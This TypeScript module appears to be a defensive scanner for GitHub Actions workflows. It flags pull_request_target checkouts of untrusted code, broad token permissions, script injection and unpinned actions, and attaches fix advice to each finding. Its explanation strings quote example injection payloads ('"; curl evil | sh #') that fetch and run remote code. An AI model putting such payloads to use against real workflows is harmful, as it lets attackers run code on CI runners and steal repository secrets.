import type { Finding, RepoRef } from "../../engine/types";

/** Find the 1-based line number of the first line containing `needle`. */
function lineOf(content: string, needle: string): number | undefined {
  const lines = content.split("\n");
  const idx = lines.findIndex((l) => l.includes(needle));
  return idx === -1 ? undefined : idx + 1;
}

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

/** `on:` can be a string, an array, or a map. Normalize to a set of triggers. */
function triggerSet(on: unknown): Set<string> {
  if (typeof on === "string") return new Set([on]);
  if (Array.isArray(on))
    return new Set(on.filter((x): x is string => typeof x === "string"));
  if (isRecord(on)) return new Set(Object.keys(on));
  return new Set();
}

/** Untrusted contexts that flow attacker-controlled text into `run:` shells. */
const INJECTION_CONTEXTS = [
  "github.event.issue.title",
  "github.event.issue.body",
  "github.event.pull_request.title",
  "github.event.pull_request.body",
  "github.event.comment.body",
  "github.event.review.body",
  "github.event.pull_request.head.ref",
  "github.event.head_commit.message",
  "github.head_ref",
];

/** Refs that check out the untrusted PR head under pull_request_target. */
const UNTRUSTED_CHECKOUT_REFS = [
  "github.event.pull_request.head.sha",
  "github.event.pull_request.head.ref",
  "github.head_ref",
  "refs/pull/",
];

interface StepShape {
  uses?: unknown;
  run?: unknown;
  with?: unknown;
}

function stepsOf(job: unknown): StepShape[] {
  if (!isRecord(job) || !Array.isArray(job.steps)) return [];
  return job.steps.filter(isRecord) as StepShape[];
}

/** Third-party action refs pinned to a floating tag rather than a full SHA. */
function isUnpinnedThirdParty(uses: string): boolean {
  const at = uses.lastIndexOf("@");
  if (at === -1) return false; // local action (./…) or docker — out of scope
  const owner = uses.split("/")[0] ?? "";
  // First-party actions are trusted; everything else should be SHA-pinned.
  if (owner === "actions" || owner === "github") return false;
  const ref = uses.slice(at + 1);
  const isFullSha = /^[0-9a-f]{40}$/.test(ref);
  return !isFullSha;
}

export function analyzeWorkflow(
  repo: RepoRef,
  path: string,
  content: string,
  doc: unknown,
): Finding[] {
  const findings: Finding[] = [];
  const repoName = `${repo.owner}/${repo.repo}`;
  const url = `https://github.com/${repoName}/blob/${repo.defaultBranch}/${path}`;
  const base = (line?: number) => ({
    repo: repoName,
    path,
    url: line ? `${url}#L${line}` : url,
    line,
  });

  if (!isRecord(doc)) return findings;

  const triggers = triggerSet(doc.on);
  const jobs = isRecord(doc.jobs) ? doc.jobs : {};
  const jobList = Object.values(jobs);

  // Rule: pull_request_target checking out untrusted PR code.
  if (triggers.has("pull_request_target")) {
    for (const job of jobList) {
      for (const step of stepsOf(job)) {
        const uses = typeof step.uses === "string" ? step.uses : "";
        const withRef =
          isRecord(step.with) && typeof step.with.ref === "string"
            ? step.with.ref
            : "";
        if (
          uses.startsWith("actions/checkout") &&
          UNTRUSTED_CHECKOUT_REFS.some((r) => withRef.includes(r))
        ) {
          findings.push({
            id: "workflows/pull-request-target-checkout",
            scanner: "workflows",
            severity: "critical",
            title: `pull_request_target checks out untrusted PR code in ${path}`,
            evidence: {
              ...base(lineOf(content, "pull_request_target")),
              detail:
                "pull_request_target runs with repo secrets and write token, then checks out attacker-controlled code — the classic RCE combination.",
            },
            fix: "Use `pull_request` instead, or if you need base-repo secrets, split into two workflows: an untrusted build on `pull_request` that uploads an artifact, and a trusted `workflow_run` that consumes it. Never check out the PR head under pull_request_target.",
            why: "Anyone can open a PR from a fork. This workflow runs that stranger's code with your repo's secrets and a write token — they can exfiltrate your secrets or push to your repo just by opening a pull request.",
            agentPrompt: `In ${path}, a job triggered by pull_request_target checks out the untrusted PR head. Rewrite it so untrusted code never runs with secrets: either switch the trigger to \`pull_request\`, or split it into an untrusted \`pull_request\` build that uploads an artifact plus a trusted \`workflow_run\` that consumes it. Remove the \`with.ref\` that checks out the PR head under pull_request_target.`,
          });
        }
      }
    }
  }

  // Rule: overly broad permissions (write-all at workflow or job level).
  const permsBroad = (perms: unknown): boolean =>
    perms === "write-all" ||
    (isRecord(perms) &&
      Object.values(perms).some((v) => v === "write") &&
      Object.keys(perms).length >= 6);
  const workflowPerms = doc.permissions;
  if (permsBroad(workflowPerms)) {
    findings.push({
      id: "workflows/broad-permissions",
      scanner: "workflows",
      severity: "high",
      title: `Workflow grants overly broad permissions in ${path}`,
      evidence: {
        ...base(lineOf(content, "permissions")),
        detail:
          "A broad token means a compromised step (or dependency) can push code, publish releases, or tamper with the repo.",
      },
      fix: "Set `permissions: {}` at the top and grant the least privilege each job needs (e.g. `contents: read`). Add write scopes only on the specific job that requires them.",
      why: "The workflow's token can write everything — code, releases, packages, pages. One compromised step or a malicious transitive dependency inherits all of it and can rewrite your repo or ship a poisoned release.",
      agentPrompt: `In ${path}, the workflow token is over-scoped (write-all or broad write). Add \`permissions: {}\` at the workflow top level, then grant each job only the least privilege it needs (usually \`contents: read\`), adding a specific write scope like \`contents: write\` only on the one job that truly requires it.`,
    });
  }

  // Rule: script injection via untrusted context in run steps.
  for (const job of jobList) {
    for (const step of stepsOf(job)) {
      if (typeof step.run !== "string") continue;
      const run = step.run;
      const hit = INJECTION_CONTEXTS.find((c) => run.includes(c));
      if (hit) {
        findings.push({
          id: "workflows/script-injection",
          scanner: "workflows",
          severity: "high",
          title: `Untrusted \${{ ${hit} }} interpolated into a run step in ${path}`,
          evidence: {
            ...base(lineOf(content, hit)),
            detail:
              'Attacker-controlled text is substituted directly into the shell before it runs — a PR title of `"; curl evil | sh #` executes.',
          },
          fix: `Pass the value through an intermediate env var instead of interpolating it inline: set \`env: TITLE: \${{ ${hit} }}\` on the step and reference \`"$TITLE"\` in the script, so the shell treats it as data, not code.`,
          why: `\${{ ${hit} }} is attacker-controlled text pasted straight into your shell before it runs. Someone titles their PR \`"; curl evil.sh | sh #\` and your runner executes it with your token.`,
          agentPrompt: `In ${path}, a run step interpolates the untrusted expression \${{ ${hit} }} directly into the shell (a script-injection risk). Move it into an intermediate env var on the step — \`env:\` with the expression — and reference the quoted \`"$VAR"\` in the run script so the shell treats it as data, not code. Apply the same fix to any sibling steps that interpolate untrusted github.event values.`,
        });
        break; // one per step is enough
      }
    }
  }

  // Rule: unpinned third-party actions.
  const seenActions = new Set<string>();
  for (const job of jobList) {
    for (const step of stepsOf(job)) {
      if (typeof step.uses !== "string") continue;
      if (!isUnpinnedThirdParty(step.uses)) continue;
      if (seenActions.has(step.uses)) continue;
      seenActions.add(step.uses);
      findings.push({
        id: "workflows/unpinned-action",
        scanner: "workflows",
        severity: "medium",
        title: `Third-party action ${step.uses} is not pinned to a commit SHA in ${path}`,
        evidence: {
          ...base(lineOf(content, step.uses)),
          detail:
            "A floating tag can be moved by the action's maintainer (or an attacker who compromises them) to run new code in your pipeline.",
        },
        fix: `Pin to a full 40-character commit SHA: \`uses: ${step.uses.split("@")[0]}@<sha>  # ${step.uses.split("@")[1] ?? "tag"}\`. Let Dependabot bump the SHA.`,
        why: `A tag like \`@v1\` is mutable. If the action's maintainer is compromised (or turns malicious), they repoint the tag and your pipeline runs their new code with your secrets the next time it fires — no change on your side.`,
        agentPrompt: `In ${path}, the third-party action \`${step.uses}\` is pinned to a mutable tag, not a commit SHA. Replace the ref with the full 40-character commit SHA of that release, keeping the tag in a trailing comment (e.g. \`uses: ${step.uses.split("@")[0]}@<sha>  # ${step.uses.split("@")[1] ?? "tag"}\`). Do the same for every other third-party (non-actions/, non-github/) action in the file, and enable Dependabot for github-actions so the SHAs still get bumped.`,
      });
    }
  }

  return findings;
}
